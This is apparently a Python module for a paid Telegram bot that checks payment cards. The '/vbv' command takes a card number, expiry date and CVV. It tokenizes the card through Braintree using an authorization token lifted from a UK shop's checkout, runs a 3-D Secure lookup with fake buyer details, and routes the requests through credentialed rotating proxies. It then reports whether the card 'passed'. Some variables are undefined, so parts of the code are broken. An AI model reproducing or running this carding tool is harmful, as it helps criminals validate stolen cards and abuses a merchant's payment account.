import time
import re
import random
import aiohttp
import asyncio
import requests
import traceback
from pyrogram import Client, filters
from EQUROBOT import app
from EQUROBOT.core.mongo import has_premium_access
from fake_useragent import UserAgent
from collections import defaultdict

user_request_times = defaultdict(list)

user_agent = UserAgent()
user = user_agent.random



proxy_list = [
    "http://tickets:proxyon145@107.172.229.182:12345",
    "http://tickets:proxyon145@104.160.17.116:12345",
    "http://tickets:proxyon145@198.46.172.86:12345",
    "http://tickets:proxyon145@50.3.137.165:12345",
    "http://tickets:proxyon145@162.212.170.77:12345",
    "http://tickets:proxyon145@23.94.251.43:12345",
    "http://tickets:proxyon145@162.212.170.252:12345",
    "http://tickets:proxyon145@104.206.81.209:12345",
    "http://tickets:proxyon145@23.104.162.39:12345",
    "http://tickets:proxyon145@192.227.241.115:12345",
]


def get_random_proxy():
    return {"http": random.choice(proxy_list), "https": random.choice(proxy_list)}


async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                else:
                    return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError:
            return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"


async def check_card(card_info, message):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    start_time = time.time()

    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjc5NDUwOTMsImp0aSI6IjRkOTEwYzU0LTY3MTYtNDRkYy05MWUzLWZkOWQ5OTIyYTk2OCIsInN1YiI6IndjcjNjdmMyMzdxN2p6NmIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IndjcjNjdmMyMzdxN2p6NmIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.eyr0lVabHP1nr5MJZ9E8MVH2oNolqShKW-9I9Os33y9wUDlfg_udKEt10_l2-sJV8fkHgBMOXgFCF1JhOlvEGQ',
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "priority": "u=1, i",
        "referer": "https://assets.braintreegateway.com/",
        "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": user,
    }

    json_data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": "091fd1d0-67fa-4f18-bfba-642a00b8667c",
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": "UB4 9AX",
                        "streetAddress": "262-264 Yeading Ln",
                    },
                },
                "options": {
                    "validate": False,
                },
            },
        },
        "operationName": "TokenizeCreditCard",
    }

    try:
        proxy = get_random_proxy()
        response = requests.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=json_data,
            proxies=proxy,
        )
        response_data = response.json()

        if "errors" in response_data:
            return f"Failed to tokenize the card. Error details: {response_data.get('errors')}"

        token = response_data["data"]["tokenizeCreditCard"]["token"]
        print("Payment ID Creation ✅", token)

        lookup_headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://hakko.co.uk",
            "priority": "u=1, i",
            "referer": "https://hakko.co.uk/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": user,
        }

        lookup_json_data = {
            "amount": "904.06",
            "browserColorDepth": 24,
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-US",
            "browserScreenHeight": 768,
            "browserScreenWidth": 1366,
            "browserTimeZone": -330,
            "deviceChannel": "Browser",
            "additionalInfo": {
                "shippingGivenName": "Isabella ",
                "shippingSurname": "Martin",
                "ipAddress": "106.208.150.64",
                "billingLine1": "Dee St",
                "billingLine2": "",
                "billingCity": "Banchory",
                "billingState": "",
                "billingPostalCode": "AB31 5HS",
                "billingCountryCode": "GB",
                "billingPhoneNumber": "01330822625",
                "billingGivenName": "Isabella ",
                "billingSurname": "Martin",
                "shippingLine1": "Dee St",
                "shippingLine2": "",
                "shippingCity": "Banchory",
                "shippingState": "",
                "shippingPostalCode": "AB31 5HS",
                "shippingCountryCode": "GB",
                "email": "n62bqm@qacmjeq.com",
            },
            "challengeRequested": True,
            "bin": "446966",
            "dfReferenceId": "0_d58bc780-01fc-4114-819f-7dddc3e1b0b6",
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.106.0",
                "cardinalDeviceDataCollectionTimeElapsed": 1390,
                "issuerDeviceDataCollectionTimeElapsed": 901,
                "issuerDeviceDataCollectionResult": True,
            },
            'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjc5NDUwOTMsImp0aSI6IjRkOTEwYzU0LTY3MTYtNDRkYy05MWUzLWZkOWQ5OTIyYTk2OCIsInN1YiI6IndjcjNjdmMyMzdxN2p6NmIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IndjcjNjdmMyMzdxN2p6NmIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.eyr0lVabHP1nr5MJZ9E8MVH2oNolqShKW-9I9Os33y9wUDlfg_udKEt10_l2-sJV8fkHgBMOXgFCF1JhOlvEGQ',
            "braintreeLibraryVersion": "braintree/web/3.106.0",
            "_meta": {
                "merchantAppId": "hakko.co.uk",
                "platform": "web",
                "sdkVersion": "3.106.0",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": "091fd1d0-67fa-4f18-bfba-642a00b8667c",
            },
        }

        lookup_response = requests.post(
            f"https://api.braintreegateway.com/merchants/wcr3cvc237q7jz6b/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
            headers=lookup_headers,
            json=lookup_json_data,
            proxies=proxy,
        )
        lookup_response_data = lookup_response.json()
        print(lookup_response_data)
        msg = (
            lookup_response_data.get("paymentMethod", {})
            .get("threeDSecureInfo", {})
            .get("status", "")
        )

        brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6])

        if "authenticate_successful" in msg:
            status = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅"
            resp = "Authenticate Successful"
        elif "authenticate_attempt_successful" in msg:
            status = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅"
            resp = "Authenticate Attempt Successful"
        elif "authentication_unavailable" in msg:
            status = "𝗣𝗮𝘀𝘀𝗲𝗱 ✅"
            resp = "Authentication Unavailable"
        elif "authenticate_frictionless_failed" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Authenticate Frictionless Failed"
        elif "authenticate_rejected" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Authenticate Rejected"
        elif "challenge_required" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Challenge Required"
        elif "lookup_card_error" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Lookup Card Error"
        elif "lookup_error" in msg:
            status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
            resp = "Lookup Error"
        else:
            status = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧 ⚠️"
            resp = "Unexpected response"

        execution_time = round(time.time() - start_time, 2)

        final_response = (
            f"{status}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ 3DS Lookup\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {resp}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {execution_time} **Seconds**\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
        )

        return final_response

    except Exception as e:
        error_message = f"An error occurred: {str(e)}\n"
        error_type = f"Error Type: {type(e).__name__}\n"
        traceback_details = traceback.format_exc()
        full_error = error_message + error_type + traceback_details
        print(full_error)
        return "An internal error occurred, please try again later."


def check_user_limit(user_id):
    if user_id in ADMIN_IDS:
        return True, 0

    current_time = time.time()

    user_request_times[user_id] = [
        t for t in user_request_times[user_id] if current_time - t < 15
    ]

    if len(user_request_times[user_id]) >= 3:
        time_diff = 15 - (current_time - user_request_times[user_id][0])
        return False, round(time_diff, 2)

    user_request_times[user_id].append(current_time)
    return True, 0


card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")


@app.on_message(filters.command("vbv", prefixes=[".", "/", "!"]))
async def vbv_check_handler(client, message):
    user_id = message.from_user.id

    if not await has_premium_access(message.from_user.id):
        return await message.reply_text("You don't have premium access. contact my owner to purchase premium")

    if not allowed:
        await message.reply(
            f"🚫 **Anti-Spam** Detected! Please try again after {remaining_time} seconds."
        )
        return

    try:
        card_info = message.text.split(maxsplit=1)[1].strip()
    except IndexError:
        await message.reply(
            "Please provide the card details in the format: `card_number|mm|yy|cvv`"
        )
        return

    if not card_pattern.fullmatch(card_info):
        await message.reply(
            "Invalid format. Please provide the card details in the format: `card_number|mm|yy|cvv`."
        )
        return

    processing_msg = await message.reply("Processing your request...")

    try:
        response = await check_card(card_info, message)
        await processing_msg.edit_text(response)
    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")
        
